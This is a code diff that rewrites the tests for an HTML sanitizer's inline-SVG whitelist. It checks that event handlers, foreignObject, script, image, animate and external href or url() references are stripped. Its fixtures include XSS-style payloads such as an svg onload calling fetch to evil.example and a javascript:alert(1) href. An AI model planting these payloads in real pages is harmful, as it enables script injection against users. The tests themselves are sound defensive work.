@@ -57,26 +57,6 @@ describe("标签白名单", () => {
 		expect(html).not.toContain("藏在里面");
 	});
 
-	it("<svg> 这种异命名空间的壳也丢", () => {
-		const { html } = ok("<div>a</div><svg><text>b</text></svg>");
-		expect(html).toBe("<div>a</div>");
-	});
-
-	/**
-	 * 内联 svg 是「开放重写」里**单列最后一片、可砍**的那一片(ADR-0014 决策 11 的 🔗)——
-	 * 这一轮没做,所以它连同事件属性一起整段丢。事件属性这一条不看标签:`onload` 挂在
-	 * 哪里都是给 `--no-sandbox` 的 puppeteer 开门。
-	 */
-	it("<svg onload=…> 连壳带事件属性整段丢 —— svg 这轮不做", () => {
-		const { html, warnings } = ok(
-			'<p>留下</p><svg onload="fetch(\'https://evil.example\')"><circle r="4"></circle></svg>',
-		);
-		expect(html).toBe("<p>留下</p>");
-		expect(html).not.toContain("onload");
-		expect(html).not.toContain("evil.example");
-		expect(warnings.join()).toContain("svg");
-	});
-
 	/**
 	 * 放宽的是**排版语义**那一批(ADR-0014 决策 11 的 🔗:列表 / 标题 / 表格 / 分节 /
 	 * 引用 / 代码…)。地板没动:脚本、外链、内嵌文档、表单、音视频一个都不进来。
@@ -362,5 +342,147 @@ describe("硬失败", () => {
 		expect(bad("<script>alert(1)</script>").join()).toContain("不剩");
 		expect(bad("   ").join()).toContain("不剩");
 		expect(bad("").join()).toContain("不剩");
+	});
+});
+
+/**
+ * 内联 svg(ADR-0014 决策 11 的 🔗,2026-09-14 补上的最后一片):SVG 命名空间走**自己的
+ * 一张白名单**,与 HTML 那张互不串门。每条守卫仍挑「到了浏览器就出事」的形状:
+ * `foreignObject` 是把 HTML 再塞回来的门、`href` 是 svg 里唯一的取网面、`url()` 在
+ * 表现属性里能指向外部文档。
+ */
+describe("内联 svg", () => {
+	it("形状 / 渐变 / use 整套保留,事件属性照丢", () => {
+		const input =
+			'<svg viewBox="0 0 24 24" width="24" height="24" onload="fetch(\'https://evil.example\')">' +
+			'<defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#fb7299"></stop><stop offset="1" stop-color="#00f0ff"></stop></linearGradient></defs>' +
+			'<path d="M2 2h20v20H2z" fill="url(#g)" stroke="#fff" stroke-width="1.5"></path>' +
+			'<circle cx="12" cy="12" r="4" fill="currentColor"></circle>' +
+			'<use href="#g"></use><text x="0" y="10" font-size="8">{up.name}</text>' +
+			"</svg>";
+		const { html, warnings } = ok(input);
+		expect(html).toBe(input.replace(" onload=\"fetch('https://evil.example')\"", ""));
+		expect(html).not.toContain("onload");
+		expect(warnings.join()).toContain("onload");
+	});
+
+	it("大小写敏感的标签 / 属性名原样保留 —— linearGradient 写成 lineargradient 画不出来", () => {
+		const { html } = ok(
+			'<svg viewBox="0 0 1 1"><defs><radialGradient id="r" gradientUnits="userSpaceOnUse"></radialGradient><clipPath id="c"></clipPath></defs><rect clip-path="url(#c)" width="1" height="1"></rect></svg>',
+		);
+		expect(html).toContain("<radialGradient ");
+		expect(html).toContain('gradientUnits="userSpaceOnUse"');
+		expect(html).toContain("<clipPath ");
+	});
+
+	it("foreignObject 连子树丢 —— 那是把 HTML 再塞回 svg 的门", () => {
+		const { html, warnings } = ok(
+			'<svg><foreignObject><div>藏在里面</div></foreignObject><rect width="1" height="1"></rect></svg>',
+		);
+		expect(html).toBe('<svg><rect width="1" height="1"></rect></svg>');
+		expect(html).not.toContain("藏在里面");
+		expect(warnings.join()).toContain("foreignObject");
+	});
+
+	it("svg 里的 script / image / animate / set / a 一律连子树丢", () => {
+		for (const [evil, needle] of [
+			["<script>fetch('https://evil.example')</script>", "script"],
+			['<image href="https://evil.example/x.png"></image>', "image"],
+			['<animate attributeName="href" to="https://evil.example"></animate>', "animate"],
+			['<set attributeName="href" to="https://evil.example"></set>', "set"],
+			['<a href="https://evil.example"><rect width="1" height="1"></rect></a>', "a"],
+			['<feImage href="https://evil.example/x.png"></feImage>', "feImage"],
+		] as const) {
+			const { html, warnings } = ok(`<svg><circle r="1"></circle>${evil}</svg>`);
+			expect(html, evil).toBe('<svg><circle r="1"></circle></svg>');
+			expect(html, evil).not.toContain("evil.example");
+			expect(warnings.join(), evil).toContain(needle);
+		}
+	});
+
+	/**
+	 * `<mark>` 在 HTML 那张表里,但写在 `<svg>` 里 parse5 把它建成 SVG 命名空间的 `mark`,
+	 * 对不上 svg 那张表就丢。(`<b>` 这类「breakout」标签会被 parser 踢出 svg 变成兄弟,
+	 * 浏览器也是这么读的 —— 那不是清洗器的事。)
+	 */
+	it("svg 命名空间里的 HTML 标签也不认 —— 白名单按命名空间查", () => {
+		const { html } = ok('<svg><mark>x</mark><g><rect width="1" height="1"></rect></g></svg>');
+		expect(html).toBe('<svg><g><rect width="1" height="1"></rect></g></svg>');
+		expect(ok("<svg><b>x</b></svg>").html).toBe("<svg></svg><b>x</b>");
+	});
+
+	it("href 只准 #片段引用;外部 URL / javascript: / 相对路径整个属性丢", () => {
+		expect(ok('<svg><use href="#icon"></use></svg>').html).toBe(
+			'<svg><use href="#icon"></use></svg>',
+		);
+		for (const bad of [
+			'href="https://evil.example/x.svg#icon"',
+			'href="javascript:alert(1)"',
+			'href="x.svg#icon"',
+			'href="#"',
+			'href="#a b"',
+		]) {
+			const { html, warnings } = ok(`<svg><use ${bad}></use></svg>`);
+			expect(html, bad).toBe("<svg><use></use></svg>");
+			expect(warnings.join(), bad).toContain("href");
+		}
+	});
+
+	it("xlink:href 归一成 href,同一条 # 规矩", () => {
+		expect(ok('<svg><use xlink:href="#icon"></use></svg>').html).toBe(
+			'<svg><use href="#icon"></use></svg>',
+		);
+		const { html } = ok('<svg><use xlink:href="https://evil.example/x.svg#i"></use></svg>');
+		expect(html).toBe("<svg><use></use></svg>");
+	});
+
+	it("表现属性里的 url() 只准 url(#id);指向外部的整个属性丢", () => {
+		const { html, warnings } = ok(
+			'<svg><rect fill="url(#g)" stroke="url(https://evil.example/x.svg#p)" filter="url(#f)" mask="url( #m )" width="1" height="1"></rect></svg>',
+		);
+		expect(html).toContain('fill="url(#g)"');
+		expect(html).toContain('filter="url(#f)"');
+		expect(html).toContain('mask="url(#m)"');
+		expect(html).not.toContain("stroke=");
+		expect(html).not.toContain("evil.example");
+		expect(warnings.join()).toContain("stroke");
+	});
+
+	it("id 只在 svg 元素上放行,且只准 [A-Za-z][A-Za-z0-9_-]*;HTML 元素上照丢", () => {
+		expect(ok('<svg><linearGradient id="g-1"></linearGradient></svg>').html).toContain('id="g-1"');
+		const { html, warnings } = ok('<svg><linearGradient id="1g"></linearGradient></svg>');
+		expect(html).toBe("<svg><linearGradient></linearGradient></svg>");
+		expect(warnings.join()).toContain("id");
+		expect(ok('<div id="x">y</div>').html).toBe("<div>y</div>");
+	});
+
+	it("svg 元素的 style 走同一份声明级过滤:url() 不放行,要用属性写 fill=url(#g)", () => {
+		const { html, warnings } = ok(
+			'<svg><rect style="fill:url(#g);opacity:.5" width="1" height="1"></rect></svg>',
+		);
+		expect(html).toContain('style="opacity:.5"');
+		expect(html).not.toContain("url(");
+		expect(warnings.join()).toContain("url");
+	});
+
+	it("其它命名空间前缀的属性(xml:space / xmlns:xlink)与不在名单的属性丢掉", () => {
+		const { html, warnings } = ok(
+			'<svg xmlns:xlink="http://www.w3.org/1999/xlink" xml:space="preserve" data-x="1" tabindex="0"><rect width="1" height="1"></rect></svg>',
+		);
+		expect(html).toBe('<svg><rect width="1" height="1"></rect></svg>');
+		expect(warnings.join()).toContain("tabindex");
+	});
+
+	it("text 里的占位符同样对表 —— 缺字段整块拒收", () => {
+		expect(ok("<svg><text>{live.title}</text></svg>").html).toContain("{live.title}");
+		expect(bad("<svg><text><tspan>{sc.price}</tspan></text></svg>").join()).toContain("sc.price");
+	});
+
+	it("滤镜整套放行(除 feImage)—— 霓虹辉光就靠它", () => {
+		const input =
+			'<svg><defs><filter id="glow" x="-50%" y="-50%" width="200%" height="200%"><feGaussianBlur in="SourceGraphic" stdDeviation="3" result="b"></feGaussianBlur><feMerge><feMergeNode in="b"></feMergeNode><feMergeNode in="SourceGraphic"></feMergeNode></feMerge></filter></defs><text filter="url(#glow)">霓虹</text></svg>';
+		const { html, warnings } = ok(input);
+		expect(html).toBe(input);
+		expect(warnings).toEqual([]);
 	});
 });
